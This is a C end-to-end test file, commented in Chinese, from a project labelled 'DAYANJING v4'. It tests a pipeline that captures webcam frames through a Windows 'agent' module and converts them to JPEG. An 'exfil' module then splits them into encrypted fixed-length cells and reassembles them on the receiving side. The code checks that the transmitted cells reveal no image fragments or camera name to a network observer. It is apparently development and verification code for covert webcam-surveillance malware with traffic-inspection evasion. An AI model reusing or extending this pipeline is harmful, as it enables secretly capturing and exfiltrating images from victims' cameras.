/*
 * DAYANJING v4 — test_cam_e2e.c
 *
 * 采集 → 回传 端到端闭环。
 *
 * 这不是单元测试，是把两个真实模块串起来的链路验证：
 *   agent_windows 采集（mock 源，走与 Windows 真机完全相同的转码路径）
 *     -> cam_frame_to_jpeg 产出 JPEG
 *     -> 21_exfil 封装成定长信元（AEAD）
 *     -> 接收侧重组
 *     -> 校验：字节级一致 + 仍是合法 JPEG
 *
 * 中间跳取证：信元流中不得出现 JPEG 的任何长片段（SOI/EOI 这类 2 字节
 * 特征在随机密文中会自然命中，不作判据；用 >=16 字节片段）。
 */

#include "exfil.h"
#include "camera.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

static int g_pass = 0;
static int g_fail = 0;

#define CHECK(cond, name)                                        \
    do {                                                         \
        if (cond) { g_pass++; printf("[PASS] %s\n", (name)); }    \
        else      { g_fail++; printf("[FAIL] %s\n", (name)); }    \
    } while (0)

static const uint8_t K_SEND[16] = {
    0x0b,0x1c,0x2d,0x3e,0x4f,0x50,0x61,0x72,
    0x83,0x94,0xa5,0xb6,0xc7,0xd8,0xe9,0xfa
};
static const uint8_t K_RECV[16] = {
    0xf0,0xe1,0xd2,0xc3,0xb4,0xa5,0x96,0x87,
    0x78,0x69,0x5a,0x4b,0x3c,0x2d,0x1e,0x0f
};
static const uint8_t PFX[8] = { 0xaa,0xbb,0xcc,0xdd,0xee,0xff,0x00,0x11 };

static int contains(const uint8_t *hay, size_t n,
                    const uint8_t *needle, size_t m) {
    if (m == 0 || n < m) return 0;
    for (size_t i = 0; i + m <= n; i++) {
        if (memcmp(hay + i, needle, m) == 0) return 1;
    }
    return 0;
}

static int is_jpeg(const uint8_t *d, size_t n) {
    if (!d || n < 4) return 0;
    if (d[0] != 0xFF || d[1] != 0xD8) return 0;         /* SOI */
    if (d[n - 2] != 0xFF || d[n - 1] != 0xD9) return 0; /* EOI */
    return 1;
}

int main(void) {
    printf("=== 采集 -> 回传 端到端闭环 ===\n");

    /* ---- 1. 采集 ---- */
    cam_source_t *src = cam_source_create("mock");
    CHECK(src != NULL, "创建采集源");
    if (!src) return 1;

    cam_config_t cfg;
    memset(&cfg, 0, sizeof(cfg));
    cfg.width = 640;
    cfg.height = 480;
    cfg.fps = 15;
    cfg.capture_ms = 300;
    cfg.max_frames = 1;
    cfg.prefer_mjpeg = true;

    CHECK(src->open(src, &cfg) == CAM_OK, "打开采集设备");

    cam_frame_t frame;
    memset(&frame, 0, sizeof(frame));
    int got = 0;
    for (int i = 0; i < 30 && !got; i++) {
        if (src->capture(src, &frame) == CAM_OK && frame.len > 0) got = 1;
    }
    CHECK(got, "采集到一帧");
    if (!got) { src->close(src); cam_source_destroy(src); return 1; }
    printf("      原始帧: fmt=%d %ux%u len=%zu\n",
           (int)frame.fmt, frame.width, frame.height, frame.len);

    /* ---- 2. 转 JPEG（与 Windows 真机同一条转码路径） ----
     * 接口语义（读源码确认，勿凭猜测）：
     *   out == NULL  -> 探测模式，所需长度写入 *out_len（不是 *out_cap）
     *   *out_cap 不足 -> 返回 CAM_ERR_TRANSFORM 并回填所需长度，不越界写
     */
    size_t cap = 0, len = 0;
    CHECK(cam_frame_to_jpeg(&frame, NULL, &cap, &len) == CAM_OK, "探测 JPEG 容量");
    CHECK(len > 0, "探测回填所需长度（写到 out_len）");

    uint8_t *jpg = (uint8_t *)malloc(len);
    if (!jpg) { src->close(src); cam_source_destroy(src); return 1; }
    size_t jcap = len;
    size_t jlen = 0;
    CHECK(cam_frame_to_jpeg(&frame, jpg, &jcap, &jlen) == CAM_OK, "转码为 JPEG 成功");
    CHECK(jlen == len, "转码长度与探测一致");
    CHECK(jlen > 0 && jlen <= jcap, "JPEG 长度合法");
    CHECK(is_jpeg(jpg, len), "转码产物是合法 JPEG（SOI..EOI）");
    printf("      JPEG: %zu 字节\n", len);

    src->close(src);
    cam_source_destroy(src);

    /* ---- 3. 经 exfil 通道回传 ---- */
    exfil_chan_t tx, rx;
    CHECK(exfil_chan_init(&tx, K_SEND, K_RECV, PFX, 0) == EXF_OK, "发送通道初始化");
    CHECK(exfil_chan_init(&rx, K_RECV, K_SEND, PFX, 0) == EXF_OK, "接收通道初始化");

    exfil_rec_t r;
    memset(&r, 0, sizeof(r));
    r.type   = EXF_TYPE_CAMERA_JPEG;
    r.seq    = 1;
    r.ts_us  = frame.pts_us;
    r.width  = frame.width;
    r.height = frame.height;
    r.flags  = EXF_FLAG_KEYFRAME | EXF_FLAG_LAST;
    snprintf(r.name, sizeof(r.name), "mock-camera-0");
    r.payload = jpg;
    r.plen    = len;

    size_t ncells = 0;
    CHECK(exfil_send_cells(&r, &ncells) == EXF_OK, "计算信元数");
    printf("      %zu 字节记录 -> %zu 个信元（线上 %zu 字节）\n",
           exfil_rec_len(&r), ncells, ncells * P2P_CELL_WIRE);

    uint8_t *wire = (uint8_t *)malloc(ncells * P2P_CELL_WIRE);
    size_t got_cells = 0;
    CHECK(exfil_chan_send(&tx, &r, wire, ncells * P2P_CELL_WIRE, &got_cells) == EXF_OK,
          "封装并发送");
    CHECK(got_cells == ncells, "信元数一致");

    /* ---- 4. 接收重组 ---- */
    uint8_t *out = (uint8_t *)malloc(len + 64);
    exfil_rec_t rd;
    size_t outlen = 0;
    int rc = 0;
    for (size_t i = 0; i < got_cells; i++) {
        rc = exfil_chan_feed(&rx, wire + i * P2P_CELL_WIRE, &rd,
                             out, len + 64, &outlen);
        if (rc < 0) break;
    }
    CHECK(rc == EXF_DONE, "重组完成（收到 FIN）");
    CHECK(outlen == len, "重组长度与原始 JPEG 一致");
    CHECK(memcmp(out, jpg, len) == 0, "重组结果字节级一致");
    CHECK(is_jpeg(out, outlen), "重组结果仍是合法 JPEG");
    CHECK(rd.type == EXF_TYPE_CAMERA_JPEG, "产物类型一致");
    CHECK(rd.width == frame.width && rd.height == frame.height, "分辨率一致");
    CHECK(rd.seq == 1, "帧序号一致");
    CHECK(exfil_chan_incomplete(&rx) == 0, "批已完整");

    /* ---- 5. 中间跳取证 ---- */
    size_t wbytes = got_cells * P2P_CELL_WIRE;
    CHECK(!contains(wire, wbytes, jpg, 16), "信元流不含 JPEG 首 16 字节");
    CHECK(!contains(wire, wbytes, jpg + len / 2, 16), "信元流不含 JPEG 中段 16 字节");
    CHECK(!contains(wire, wbytes, (const uint8_t *)"mock-camera-0", 13),
          "信元流不含设备名");

    free(wire);
    free(out);
    free(jpg);

    /* ---- 6. 第二链路：YUYV422 原生帧 -> 转码 -> 回传 ----
     * 多数摄像头原生格式为 YUYV/MJPEG。上面走的是 MJPEG 直通，
     * 这里覆盖真正的**转码**路径，且用 320x240 的大帧（跨多个信元）。 */
    printf("\n--- YUYV422 转码链路 ---\n");
    uint32_t w = 320, h = 240;
    size_t ylen = (size_t)w * h * 2;
    uint8_t *yuyv = (uint8_t *)malloc(ylen);
    if (yuyv) {
        uint32_t sd = 0xc0ffeeu;
        for (size_t i = 0; i < ylen; i++) {
            sd ^= sd << 13; sd ^= sd >> 17; sd ^= sd << 5;
            yuyv[i] = (uint8_t)(sd & 0xff);
        }
        cam_frame_t yf;
        memset(&yf, 0, sizeof(yf));
        yf.data = yuyv; yf.len = ylen;
        yf.fmt = CAM_FMT_YUYV422;
        yf.width = w; yf.height = h;
        yf.pts_us = 1700000000999999ULL;

        size_t ycap = 0, yneed = 0;
        CHECK(cam_frame_to_jpeg(&yf, NULL, &ycap, &yneed) == CAM_OK, "YUYV 探测容量");
        CHECK(yneed > 0, "YUYV 探测长度非零");
        uint8_t *yjpg = (uint8_t *)malloc(yneed);
        size_t ycap2 = yneed, ylen2 = 0;
        CHECK(cam_frame_to_jpeg(&yf, yjpg, &ycap2, &ylen2) == CAM_OK, "YUYV 转码成功");
        CHECK(is_jpeg(yjpg, ylen2), "YUYV 转码产物是合法 JPEG");
        printf("      YUYV %ux%u -> JPEG %zu 字节\n", w, h, ylen2);

        exfil_rec_t r2;
        memset(&r2, 0, sizeof(r2));
        r2.type = EXF_TYPE_CAMERA_JPEG;
        r2.seq = 2; r2.ts_us = yf.pts_us;
        r2.width = w; r2.height = h;
        r2.flags = EXF_FLAG_KEYFRAME;
        snprintf(r2.name, sizeof(r2.name), "yuyv-cam-0");
        r2.payload = yjpg; r2.plen = ylen2;

        size_t n2 = 0;
        exfil_send_cells(&r2, &n2);
        printf("      %zu 字节 -> %zu 个信元\n", exfil_rec_len(&r2), n2);
        CHECK(n2 > 1, "大帧跨越多个信元");
        uint8_t *w2 = (uint8_t *)malloc(n2 * P2P_CELL_WIRE);
        size_t g2 = 0;
        CHECK(exfil_chan_send(&tx, &r2, w2, n2 * P2P_CELL_WIRE, &g2) == EXF_OK, "YUYV 帧发送成功");

        uint8_t *o2 = (uint8_t *)malloc(ylen2 + 64);
        exfil_rec_t rd2;
        size_t o2len = 0;
        int rc2 = 0;
        for (size_t i = 0; i < g2; i++) {
            rc2 = exfil_chan_feed(&rx, w2 + i * P2P_CELL_WIRE, &rd2,
                                  o2, ylen2 + 64, &o2len);
            if (rc2 < 0) break;
        }
        CHECK(rc2 == EXF_DONE, "YUYV 帧重组完成");
        CHECK(o2len == ylen2, "YUYV 帧重组长度一致");
        CHECK(memcmp(o2, yjpg, ylen2) == 0, "YUYV 帧字节级一致");
        CHECK(is_jpeg(o2, o2len), "YUYV 帧重组后仍是合法 JPEG");
        CHECK(rd2.width == w && rd2.height == h, "YUYV 帧分辨率一致");
        CHECK(!contains(w2, g2 * P2P_CELL_WIRE, yjpg, 16), "YUYV 信元流不含明文首 16 字节");
        free(w2); free(o2); free(yjpg); free(yuyv);
    }

    exfil_chan_wipe(&tx);
    exfil_chan_wipe(&rx);

    printf("\n=== total=%d pass=%d fail=%d ===\n", g_pass + g_fail, g_pass, g_fail);
    return g_fail ? 1 : 0;
}
